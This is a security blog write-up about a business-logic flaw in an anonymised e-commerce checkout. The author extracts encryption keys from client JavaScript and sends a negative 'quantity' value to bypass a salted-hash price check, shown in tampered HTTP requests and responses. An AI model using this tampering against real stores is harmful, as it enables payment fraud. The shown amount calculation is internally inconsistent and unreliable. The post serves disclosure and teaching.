---
title: "Business Logic Error: Pay Less"
layout: post
date: 2023-04-12 12:00
headerImage: false
tag:
- Business Logic Error
- Misconfiguration
- Price Manipulation
category: blog
author: naveen
description: Business Logic Error leads to pay less to the products/service the target company offers to the customers/users.
---

# Target Background
The target is an web application which allows the users to buy prduct/services online like the ecommerce application. 

## Overview
The Target company have disclosed a vulnerability report long back and the vulnerability was "a hacker was able to manipulate the amount of money should be paid for the product/service in the checkout/order page". I have tried the same exact steps to check what type of validation has been implemented in the application as a fix to that issue.

## Recon
- Hosted on AWS
- react application
- Mobile application also available
- Application requests and responses are encrypted

## Finding the Enc key
After checking the application traffic i came to know the application is encrypting the JSON payloads in the requests and responses. In order to manipulate or play with the request payload i have to find the encryption and decryption keys to encrypt and decrypt the request and response.

As usual while going through the JavaScript file i have found the encryption key, type of algorithm, mode and Initialization vector. So then i have used the online encryption tools to encrypt the payloads.

## Playing with fire🔥
I have tried playing with the price parameter in the request but no luck the application validates the amount shoud be paid with the salted Hash that's been mapped with the purchase order.

### Actual Request and Response

### Request

```http
POST /api/v1/checkout HTTP/2
Host: www.target.com
Cookie: blah...blah...blah...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.target.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers

{
  "saltedhash": "hashcode",
  "product_id": "121212",
  "price": "10",
  "quantity": "10",
  "address": "ABC city, ABC.",
  "zipcode": "123456"
}
```

### Response
```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Content-Type: application/json; charset=utf-8 
Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
Referrer-Policy: strict-origin-when-cross-origin 
Connection: close 
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  "saltedhash": "hashcode",
  "product_id": "121212",
  "price": "10",
  "quantity": "10",
  "amount_to_be_paid": "100",
  "address": "ABC city, ABC.",
  "zipcode": "123456"
}
````

The above shown is the checkout request that was sent to the server to make payments for the purchase order. The dev implemented a additional paramater `saltedhash` as the fix for the previously exploited price manipulation vulnerability.

## Bypass
After a while going through the application flow and requests i decided to check the `checkout` request by digging deeper to find something. I notice there is a paramater called `quantity` which is used to create orders based on the amount of quantity a customer requires. So i changed the value of it in **negative** value.

### Manipulated Request

```http
POST /api/v1/checkout HTTP/2
Host: www.target.com
Cookie: blah...blah...blah...
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/111.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: https://www.target.com/
Upgrade-Insecure-Requests: 1
Sec-Fetch-Dest: iframe
Sec-Fetch-Mode: navigate
Sec-Fetch-Site: cross-site
Te: trailers

{
  "saltedhash": "hashcode",
  "product_id": "121212",
  "price": "10",
  "quantity": "-5",
  "address": "ABC city, ABC.",
  "zipcode": "123456"
}
```

After changing the paramater in negative value and sending the request the server responded with a change in the amount value. The dev haven't implemented a validation on the quantity paramter which is the variable that stores the amount `quantity` value is a signed integer so the negative values will be accepted and the backend calculation on the money to be paid will be calculated based on the amount per quantity and nummber of quantities in the cart.

### Response

```http
HTTP/1.1 200 OK 
Access-Control-Allow-Origin: * 
Content-Type: application/json; charset=utf-8 
Set-Cookie: blah...blah...blah...; Path=/; HttpOnly 
X-Frame-Options: SAMEORIGIN 
X-Content-Type-Options: nosniff 
X-XSS-Protection: 1; mode=block 
Referrer-Policy: strict-origin-when-cross-origin 
Connection: close 
Strict-Transport-Security: max-age=31536000; includeSubDomains

{
  "saltedhash": "hashcode",
  "product_id": "121212",
  "price": "10",
  "quantity": "-5",
  "amount_to_be_paid": "6",
  "address": "ABC city, ABC.",
  "zipcode": "123456"
}
````

Now we can pay less amount of money for the orders we place by changing the quantity value to negative values.

Thanks for reading!

Follow me on Twitter : [thevillagehacker](https://twitter.com/thevillagehackr)